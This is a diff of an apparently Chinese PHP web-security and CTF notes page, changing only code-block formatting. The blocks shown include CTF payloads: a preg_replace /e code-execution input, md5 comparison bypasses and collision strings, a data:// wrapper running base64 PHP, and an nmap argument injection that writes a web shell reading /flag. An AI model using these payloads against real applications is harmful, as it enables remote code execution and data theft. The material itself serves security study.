@@ -1221,8 +1221,8 @@
     </span>        
     
 </h3>
-<pre tabindex="0"><code>int intval ( mixed $var [, int $base = 10 ] )
-</code></pre><p>如果有第二个base参数 x，表示把第一个字符串参数看成x进制。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>int intval ( mixed <span style="color:#ff79c6">$</span><span style="color:#ff79c6">var</span> [, int <span style="color:#ff79c6">$</span>base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span> ] )
+</span></span></code></pre></div><p>如果有第二个base参数 x，表示把第一个字符串参数看成x进制。</p>
 <p>如果 base参数 = 0，通过检测 var 的格式来决定使用的进制：</p>
 <ul>
 <li>如果字符串包括了 &ldquo;0x&rdquo; (或 &ldquo;0X&rdquo;) 的前缀，使用 16 进制 (hex)；否则，</li>
@@ -1394,8 +1394,8 @@
 <li><code>/ei</code> 表示替换内容当作 php 执行</li>
 </ul>
 <p>payload1：</p>
-<pre tabindex="0"><code> ?\S*=${phpinfo()}
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> ?\S*=${phpinfo()}
+</span></span></code></pre></div><ul>
 <li><code>\S</code> 利用 GET 上传的非法字符解析原理，解析成 <code>.</code></li>
 <li><code>.*</code> 是 key，<code>${phpinfo()}</code> 是 value</li>
 <li><code>.*</code> 贪婪匹配任意字符任意次，匹配 <code>${phpinfo()}</code></li>
@@ -1577,10 +1577,10 @@
     </span>        
     
 </h3>
-<pre tabindex="0"><code>==  和 !=  左右两边数据类型不同时，会将他们转化成同一格式进行比较。
-
-=== 和 !== 左右两边数据类型不同时，则返回false
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>==  和 !=  左右两边数据类型不同时，会将他们转化成同一格式进行比较。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>=== 和 !== 左右两边数据类型不同时，则返回false
+</span></span></code></pre></div><hr>
 
 
 <h2 class="relative group">科学记数法 
@@ -1646,10 +1646,10 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//flag
 </span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">--&gt;</span>
 </span></span></code></pre></div><p>payload：</p>
-<pre tabindex="0"><code>?a[]=1&amp;b[]=2
-
-# md5($a) == md5($b) returns true
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?a[]=1&amp;b[]=2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># md5($a) == md5($b) returns true
+</span></span></code></pre></div>
 
 <h3 class="relative group">科学计数绕过 
     <div id="%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E7%BB%95%E8%BF%87" class="anchor"></div>
@@ -1704,10 +1704,10 @@
 <li>更多： <a href="https://github.com/spaze/hashes" target="_blank">GitHub - spaze/hashes: Magic hashes – PHP hash &ldquo;collisions&rdquo;</a></li>
 </ul>
 <p>payload：</p>
-<pre tabindex="0"><code>?a=QNKCDZO&amp;b=s878926199a
-
-# md5($a) == md5($b) returns true
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?a=QNKCDZO&amp;b=s878926199a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># md5($a) == md5($b) returns true
+</span></span></code></pre></div>
 
 <h3 class="relative group">md5 碰撞 
     <div id="md5-%E7%A2%B0%E6%92%9E" class="anchor"></div>
@@ -1729,9 +1729,9 @@
 <li>hackbar 直接输入的是原始数据，会在发包的时候经过一次 URL 编码，所以直接在 hackbar 输入 URL 编码之后的数据会再次被 URL 编码，导致出错</li>
 </ul>
 <p>收集：</p>
-<pre tabindex="0"><code>TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
-TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+</span></span><span style="display:flex;"><span>TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
+</span></span></code></pre></div>
 
 <h3 class="relative group">哈希长度拓展攻击 
     <div id="%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB" class="anchor"></div>
@@ -1874,15 +1874,15 @@ protected表示受保护的，只有本类或子类或父类中可以访问</p>
     
 </h2>
 <p>PHP中把以两个下划线 <code>__</code> 开头的方法称为魔术方法(Magic methods)</p>
-<pre tabindex="0"><code>__construct() 当一个对象创建时被调用，反序列化不触发
-__destruct()  当一个对象销毁时被调用
-__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接
-__call()      当调用的方法不存在时触发
-__invoke()    当一个对象被当作函数调用时触发
-__wakeup()    反序列化时自动调用
-__get()       类中的属性私有或不存在触发
-__set()       类中的属性私有或不存在触发
-</code></pre><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>__construct() 当一个对象创建时被调用，反序列化不触发
+</span></span><span style="display:flex;"><span>__destruct()  当一个对象销毁时被调用
+</span></span><span style="display:flex;"><span>__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 <span style="color:#ff79c6">.</span> 和字符串拼接
+</span></span><span style="display:flex;"><span>__call()      当调用的方法不存在时触发
+</span></span><span style="display:flex;"><span>__invoke()    当一个对象被当作函数调用时触发
+</span></span><span style="display:flex;"><span>__wakeup()    反序列化时自动调用
+</span></span><span style="display:flex;"><span>__get()       类中的属性私有或不存在触发
+</span></span><span style="display:flex;"><span>__set()       类中的属性私有或不存在触发
+</span></span></code></pre></div><hr>
 
 
 <h2 class="relative group">非法参数名传参 
@@ -1992,9 +1992,9 @@ __set()       类中的属性私有或不存在触发
     
 </h3>
 <p>数据流封装器，以<strong>传递相应格式的数据</strong>。可以用来执行PHP代码。一般需要用到<code>base64编码</code>传输。</p>
-<pre tabindex="0"><code>?file=data://text/plain,xxxx
-?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?file=data://text/plain,xxxx
+</span></span><span style="display:flex;"><span>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</span></span></code></pre></div>
 
 <h3 class="relative group">实例 
     <div id="%E5%AE%9E%E4%BE%8B-3" class="anchor"></div>
@@ -2059,10 +2059,10 @@ __set()       类中的属性私有或不存在触发
 </span></span><span style="display:flex;"><span>    var_dump(escapeshellarg(<span style="color:#8be9fd;font-style:italic">$str3</span>));
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
 </span></span></code></pre></div><p>结果：</p>
-<pre tabindex="0"><code>string(4) &#34;&#39;ls&#39;&#34;
-string(8) &#34;&#39;ls -al&#39;&#34;
-string(10) &#34;&#39;ls&#39;\&#39;&#39;zj&#39;&#34;
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>string(4) &#34;&#39;ls&#39;&#34;
+</span></span><span style="display:flex;"><span>string(8) &#34;&#39;ls -al&#39;&#34;
+</span></span><span style="display:flex;"><span>string(10) &#34;&#39;ls&#39;\&#39;&#39;zj&#39;&#34;
+</span></span></code></pre></div>
 
 <h3 class="relative group">escapeshellcmd 
     <div id="escapeshellcmd" class="anchor"></div>
@@ -2075,8 +2075,8 @@ string(10) &#34;&#39;ls&#39;\&#39;&#39;zj&#39;&#34;
     
 </h3>
 <p>反斜线<code>\</code> 会在以下字符之前插入：</p>
-<pre tabindex="0"><code> &amp;#;`|*?~&lt;&gt;^()[]{}$\   \x0A   \xFF
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> &amp;#;`|*?~&lt;&gt;^()[]{}$\   \x0A   \xFF
+</span></span></code></pre></div><ul>
 <li>不成对的引号也会被转义</li>
 <li>在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替</li>
 </ul>
@@ -2090,10 +2090,10 @@ string(10) &#34;&#39;ls&#39;\&#39;&#39;zj&#39;&#34;
 </span></span><span style="display:flex;"><span>    var_dump(escapeshellcmd(<span style="color:#8be9fd;font-style:italic">$str3</span>));
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
 </span></span></code></pre></div><p>结果：</p>
-<pre tabindex="0"><code>string(2) &#34;ls&#34;
-string(4) &#34;ls\;&#34;
-string(8) &#34;\&#39;\;ls\;&#34;
-</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>string(2) &#34;ls&#34;
+</span></span><span style="display:flex;"><span>string(4) &#34;ls\;&#34;
+</span></span><span style="display:flex;"><span>string(8) &#34;\&#39;\;ls\;&#34;
+</span></span></code></pre></div>
 
 <h3 class="relative group">对于 arg + cmd 的参数注入 
     <div id="%E5%AF%B9%E4%BA%8E-arg--cmd-%E7%9A%84%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5" class="anchor"></div>
@@ -2147,8 +2147,8 @@ string(8) &#34;\&#39;\;ls\;&#34;
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">echo</span> system(<span style="color:#f1fa8c">&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span style="color:#ff79c6">.</span><span style="color:#8be9fd;font-style:italic">$host</span>);
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
 </span></span></code></pre></div><p>payload：</p>
-<pre tabindex="0"><code>?host=2.2.2.2&#39;&lt;?php echo `cat /flag`;?&gt; -oG test.php&#39;
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?host=2.2.2.2&#39;&lt;?php echo `cat /flag`;?&gt; -oG test.php&#39;
+</span></span></code></pre></div><ul>
 <li>-oG 是 nmap 的参数，表示写入前一个参数的内容到后一个参数所指明的文件中</li>
 </ul>
 <hr>
@@ -2209,8 +2209,8 @@ string(8) &#34;\&#39;\;ls\;&#34;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
 </span></span></code></pre></div><p>payload：</p>
-<pre tabindex="0"><code>?is=flag&amp;flag=flag
-</code></pre><p>尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>?is=flag&amp;flag=flag
+</span></span></code></pre></div><p>尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。</p>
 <hr>
 
           
